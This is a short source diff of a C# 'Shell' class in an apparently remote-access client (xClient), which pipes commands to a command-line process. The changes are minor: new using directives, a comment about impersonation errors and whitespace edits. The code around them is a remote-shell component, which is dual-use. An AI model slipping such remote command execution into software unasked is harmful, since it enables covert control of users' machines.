@@ -2,8 +2,10 @@
 using System.Diagnostics;
 using System.Globalization;
 using System.IO;
+using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using xClient.Core.Helper;
 
 namespace xClient.Core.Utilities
 {
@@ -12,6 +14,7 @@ namespace xClient.Core.Utilities
     /// </summary>
     public class Shell : IDisposable
     {
+
         /// <summary>
         /// The Process of the command-line.
         /// </summary>
@@ -179,7 +182,7 @@ namespace xClient.Core.Utilities
                     }
                 }
             }
-            catch (ObjectDisposedException)
+            catch (ObjectDisposedException) //Is this the error I'm getting with impersonation?
             {
                 // just exit
             }
@@ -254,10 +257,8 @@ namespace xClient.Core.Utilities
 
             byte[] rawCommand = Encoding.Convert(Encoding.UTF8, _encoding, Encoding.UTF8.GetBytes(command));
             string fixedEncodedCommand = _encoding.GetString(rawCommand);
-
             _inputWriter.WriteLine(fixedEncodedCommand);
             _inputWriter.Flush();
-
             return true;
         }
 
@@ -266,7 +267,7 @@ namespace xClient.Core.Utilities
         /// </summary>
         public Shell()
         {
-            CreateSession();
+            CreateSession();  
         }
 
         /// <summary>
